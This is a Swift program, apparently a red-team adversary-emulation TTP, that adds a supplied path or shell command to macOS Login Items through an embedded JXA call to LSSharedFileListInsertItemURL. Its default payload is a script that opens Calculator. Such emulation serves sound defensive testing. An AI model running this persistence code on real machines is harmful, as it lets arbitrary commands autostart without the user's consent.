// @nolint
/*
 Copyright © 2023-present, Meta Platforms, Inc. and affiliates
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in
 all copies or substantial portions of the Software.
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 THE SOFTWARE.
*/

import Foundation
import Cocoa
import OSAKit

// Main Execution
print("This TTP will add the provided path or shell command to Login Items.")

// Check if we have the necessary argument
guard CommandLine.arguments.count > 1 else {
    print("[!] Missing parameters. Usage: programName <path>")
    exit(1)
}

let commandOrPath = CommandLine.arguments[1]

// Execute default behavior if specified
if commandOrPath == "/Users/Shared/calc.sh" {
    let script = """
    #!/bin/bash
    open -a Calculator.app
    """

    let fileMan = FileManager.default

    // Check if /Users/Shared/ exists, if not, create it
    if !fileMan.fileExists(atPath: "/Users/Shared/") {
        do {
            try fileMan.createDirectory(atPath: "/Users/Shared/", withIntermediateDirectories: true, attributes: nil)
        } catch {
            print("[-] Failed to create directory at /Users/Shared/. Error: \(error)")
        }
    }

    let scriptData = Data(script.utf8)
    fileMan.createFile(atPath: commandOrPath, contents: scriptData, attributes: nil)

    var attributes = [FileAttributeKey: Any]()
    attributes[.posixPermissions] = 0o755
    do {
        try fileMan.setAttributes(attributes, ofItemAtPath: commandOrPath)
        print("[+] Successfully created file at: \(commandOrPath)")
    } catch {
        print("[-] Failed to set file attributes for: \(commandOrPath). Error: \(error)")
    }
}

// Always add to login items first
print(" ===> Attempting to create Login Item persistence")

let jxa = """
(function() {
    ObjC.import('CoreServices');
    ObjC.import('Security');
    ObjC.import('SystemConfiguration');
    let temp = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault, "\(commandOrPath)", "\(commandOrPath)".length, false);
    let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListSessionLoginItems, $.nil);
    let cfName = $.CFStringCreateWithCString($.nil, "\(commandOrPath)", $.kCFStringEncodingASCII);
    let itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);
    return "[+] \(commandOrPath) successfully added as a Login Item";
})();
"""

let script = OSAScript.init(source: jxa, language: OSALanguage.init(forName: "JavaScript"))
var scriptErr: NSDictionary?
let result = script.executeAndReturnError(&scriptErr)

if let scriptError = scriptErr {
    print("[-] Script Execution Error: \(scriptError)")
} else {
    print(result?.stringValue ?? "[+] \(commandOrPath) successfully added as a Login Item")
}
